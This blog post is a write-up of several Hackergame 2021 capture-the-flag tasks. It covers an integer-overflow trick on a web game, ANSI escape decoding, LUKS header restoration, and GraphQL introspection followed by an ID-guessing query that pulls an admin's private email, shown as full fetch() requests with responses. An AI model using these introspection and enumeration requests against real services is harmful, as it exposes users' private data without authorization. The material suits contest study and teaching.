---
layout: post
title: "Hackergame 2021 Writeup Part 2(Easy level)"
categories: Writeup Hackergame
---

This part of writeup contains tasks that require a bit programming & linux experience.

## 卖瓜

It's obvious that, you can't get exactly 20 with some 6 and 9. So there must be some magic that can help us achieve it.

As the task said, if the result becomes a float it will be invalid. But how can we turn it to a float?

I tried to put 3.3333 * 6 to the scale by changing the network packet but it didn't work. So it may be something related to integer overflow.

Let's try a $2^{63}$ level integer, $10^{18}$.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102213220.png)

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102213252.png)

Surprisingly, after adding it twice, we turned it to a float.

So looks like if the weight on the scale exceeds the maximum 64-bit signed integer, it will turn to a float.

But if we type a bigger number like $10^{19}$ which already exceeded the limit, it will add nothing to the scale.

What about to type exactly the limit $2^{63}-1$? In the 6 jin field, it won't work. But if in 9 jin field...

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102214817.png)

BOOOOOOM!

We make it overflow to negative.

And the absolute value of it can't divide by 3. So after carefully increasing it back to positive, we can get a value which has a remainder of 1 when is divided 3.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102215643.png)

Doing this again then we'll get a remainder of 2.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102215814.png)

Then just add a 6 and a 9, we'll get 20.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102215853.png)

## 透明的文件

Open the file, you'll see something like `[39m[19;61H[9;12H`. 

The format is quite similar to the thing we used to change linux terminal text color. Google it, and you'll know it's [ANSI escape code](https://en.wikipedia.org/wiki/ANSI_escape_code). 

So let's add `\033` before each `[`, which can be done with vim command `:s/\[/\\033\[/g`. And replace all invisible space character to other things like `#`.(can be done with `:s/\ /#/g` in vim)

Finally print it with echo -e, and you'll get the flag.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102221411.png)

## 图之上的信息

According to the description of the task, we know that the website is using GraphQL to communicate with its backend.

After logging in, we can see from browser DevTools that a GraphQL request is sent out to retrieve notes.

What should we do? We can take a look at graphql.org. Then we find this page [Introspection](https://graphql.org/learn/introspection/).

Just do everything it said. First, we should ask the GraphQL endpoint what types are available.

```javascript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "content-type": "application/json",
    "proxy-connection": "keep-alive"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query:`{
  __schema {
    types {
      name
    }
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// Result:
{
    "data": {
        "__schema": {
            "types": [
                {
                    "name": "Query"
                },
                {
                    "name": "GNote"
                },
                {
                    "name": "Int"
                },
                {
                    "name": "String"
                },
                {
                    "name": "GUser"
                },
                ...
            ]
        }
    }
}
```
Note that there's a GUser named similarly to GNote. So maybe the GUser type is used for describing a user.

Let's check what fields appear in GUser.
```javascript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "content-type": "application/json",
    "proxy-connection": "keep-alive"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query:`{
  __type(name: "GUser") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// Result:
{
    "data": {
        "__type": {
            "name": "GUser",
            "fields": [
                {
                    "name": "id",
                    "type": {
                        "name": "Int",
                        "kind": "SCALAR"
                    }
                },
                {
                    "name": "username",
                    "type": {
                        "name": "String",
                        "kind": "SCALAR"
                    }
                },
                {
                    "name": "privateEmail",
                    "type": {
                        "name": "String",
                        "kind": "SCALAR"
                    }
                }
            ]
        }
    }
}
```
So we know the field which contains email is called `privateEmail`.

Next, we should find out what queries are available for us.
```javascript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "content-type": "application/json",
    "proxy-connection": "keep-alive"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query:`{
  __schema {
    queryType {
      fields {
        name
      }
    }
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// Result:
{
    "data": {
        "__schema": {
            "queryType": {
                "fields": [
                    {
                        "name": "note"
                    },
                    {
                        "name": "notes"
                    },
                    {
                        "name": "user"
                    }
                ]
            }
        }
    }
}
```
According to the request for notes, we can know our `userId` is 2. So the admin's is probably 1. Then finally we can write a similar request to get admin's email.
```javascript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "content-type": "application/json",
    "proxy-connection": "keep-alive"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query:`{
  user(id: 1){
      privateEmail
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// Result:
{
    "data": {
        "user": {
            "privateEmail": "flag{dont_let_graphql_l3ak_data_3940369369@hackergame.ustc}"
        }
    }
}
```

## 加密的U盘

To solve this task, we should find out how does LUKS work. On this [FAQ Page](https://gitlab.com/cryptsetup/cryptsetup/-/wikis/FrequentlyAskedQuestions)(I found this through Wikipedia), it describes LUKS as "multiple user keys with one master key". 

That means our data is encrypted with a master key which won't change unless you reformat the disk, then it uses our user key to encrypt that master key. If we need to change the user key, then it only needs to re-encrypt the master key, instead of re-encrypting the whole disk.

So, if we use the image of first day to get that master key, then use the master key to directly decrypt the second one, we can get the flag.

Easier implementation is just backing up the whole LUKS header of the first image then recover it to the second one. That can be done with these commands.

```shell
# Setup images as loop device
sudo losetup -P /dev/loop101 day1.img
sudo losetup -P /dev/loop102 day2.img

# Back up the header of the 1st image
sudo cryptsetup luksHeaderBackup /dev/loop101p1 --header-backup-file=luks-header

# Then restore to the 2nd image
sudo cryptsetup luksHeaderRestore /dev/loop102p1 --header-backup-file=luks-header

# Mount the 2nd image with the password of first image
sudo cryptsetup luksOpen /dev/loop102p2 day2
mkdir day2
sudo mount /dev/mapper/day2 day2

# Get the flag
cat day2/flag.txt
```

## 阵列恢复大师